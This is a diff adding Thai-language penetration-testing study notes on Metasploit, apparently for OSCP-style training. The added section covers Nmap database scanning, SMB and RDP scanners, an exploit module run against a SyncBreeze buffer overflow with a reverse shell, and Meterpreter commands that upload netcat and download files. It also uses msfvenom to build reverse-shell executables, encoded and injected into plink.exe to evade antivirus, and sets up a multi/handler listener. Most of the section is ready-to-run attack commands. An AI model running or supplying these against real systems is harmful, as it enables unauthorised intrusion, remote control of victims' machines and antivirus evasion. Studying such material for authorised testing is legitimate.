@@ -807,6 +807,118 @@ show options
 # เมื่อเราตรวจสอบพารามิเตอร์ต่าง ๆ แล้ว เราสามารถใช้คำสั่ง "set" หรือ "unset" สำหรับการแก้ไขข้อมูลพารามิเตอร์ภายใต้โมดูลที่เรากำลังทำงานหรือสามารถใช้ "setg" หรือ "unsetg" สำหรับตั้งค่าตัวแปรในรูปแบบ Global Variable 
 set RHOSTS 192.168.10.10
 run
+
+
+# Database Mapping 
+# หากมีการเปิดใช้งาน Postgresql Services แล้ว Metasploit จะสามารถตรวจสอบข้อมูลเพิ่มเติมด้วยคำสั่ง services ได้ดังต่อไปนี้
+services
+services -h 
+
+# เราสามารถใช้ "db_nmap" สำหรับเก็บข้อมูลการ Scan จาก Nmap บน Metasploits ได้
+db_nmap 
+db_nmap 192.168.10.10 -A -Pn 
+
+# เราสามารถตรวจสอบข้อมูล Host ที่ตรวจพบได้ด้วยคำสั่ง "hosts"
+hosts
+services -p 445
+
+# เราสามารถแยกข้อมูลออกจากกันในแต่ละคนได้โดยการใช้งาน "workspace" ได้ดังนี้
+workspace
+workspace test
+```
+- โมดูลบน Metasploit มีดังนี้
+  - Auxiliary module ใน Metasploit Framework เป็นโมดูลที่ถูกสร้างขึ้นเพื่อให้ผู้ใช้งานเข้าถึงฟังก์ชันต่างๆ เช่น การสแกนหาช่องโหว่, การตรวจสอบความเป็นไปได้ของโปรโตคอล, การจับคู่ข้อมูลระหว่างเครื่อง ฯลฯ ซึ่งจะช่วยให้ผู้ใช้งานได้ทำการวิเคราะห์และประเมินความเสี่ยงได้อย่างละเอียดและมีประสิทธิภาพ
+
+```bash
+show auxiliary
+search -h 
+# เราสามารถใช้ "search" สำหรับกรองข้อมูลที่เราสนใจ เช่น app, type, platform ฯลฯ
+search type:auxiliary name:smb 
+
+# เราสามารถใช้คำสั่ง "info" สำหรับตรวจสอบรายละเอียดของโมดูลที่จะใช้งานได้
+use scanner/smb/smb2
+info
+# เราสามารถนำข้อมูลจากฐานข้อมูลที่มีการ Scan ไว้ก่อนหน้า มาใส่ในพารามิเตอร์ของโมดูลได้ 
+services -p 445 --rhosts 
+run 
+
+# การค้นหา RDP 
+ีuse scanner/rdp/rdp_scanner
+show options 
+set rhosts 192.168.10.10
+run
+```
+ - Exploit Modules
+```bash
+# ค้นหาช่องโหว่ที่จะโจมตี 
+search synbreeze
+# ตรวจสอบข้อมูลของโมดูลที่จะใช้โจมตี 
+info exploit/windows/http/stnbreeze_bof
+# ตรวจสอบ Payloads ที่จะใช้สำหรับโจมตี
+show payloads 
+# ตั้งค่า Payload ที่จะใช้สำหรับโจมตี
+set payload windows/shell_reverse_tcp
+# ตรวจสอบข้อมูลพารามิเตอร์ที่จำเป็น
+show options 
+# ตั้งค่าพารามิเตอร์ Local hosts หรือเครื่องของผู้โจมตี 
+set lhost 192.168.1.10
+# ตั้งค่าพารามิเตอร์ Remote hosts หรือเครื่องเป้าหมาย
+set rhost 192.168.1.20
+# ทำการตรวจสอบก่อนโจมตี
+check 
+# เริ่มต้นการโจมตี
+exploit
+```
+ - Metasploit Payloads 
+```bash
+search meterpreter type:payload
+set payload windows/meterpreter/reverse_http
+set LHOST 192.168.10.10
+show options 
+exploit
+
+# Meterpreter 
+# shell "meterpreter > " 
+help
+sysinfo
+getuid
+
+# Upload netcat 
+upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\Offsec
+
+# Download file 
+download c:\\windows\\system32\\calc.exe /tmp/calc.exe
+
+# Run Shell via Meterpreter
+shell
+exit
+```
+
+- การสร้าง Excutable Payloads ด้วย msfvenom
+
+```bash
+# Shell 
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.10 LPORT=443 -f exe -o shell_reverse.exe
+file shell_reverse.exe
+
+# The shellcode embedded in the PE file can be encoded using any of the many MSF encoders. Historically, this helped evade antivirus, though this is no longer true with modern AV engines. The encoding is configured with -e to specify the encoder type and -i to set the desired number of encoding iterations. We can use multiple encoding iterations to further obfuscate the binary, which could effectively evade rudimentary signature detection. 
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.10 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
+
+# Another useful feature of Metasploit is the ability to inject a payload into an existing PE file, which may further reduce the chances of AV detection. The injection is done with the -x flag, specifying the file to inject into.
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.10 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embeded.exe 
+
+# อีกทั้งเราสามารถสร้างผ่าน msfconsol ได้ดังต่อไปนี้
+# promp "msf6 >"
+use payload/windows/shell_reverse_tcp
+set LHOST 192.168.10.10
+set RHOST 192.168.10.20 
+generate -f -exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embeded.exe 
+```
+- Metasploit Exploit Multi Handler 
+```bash 
+use multi/handler
+set payload windows/meterpreter/reverse_https
+run 
 ```
 
 
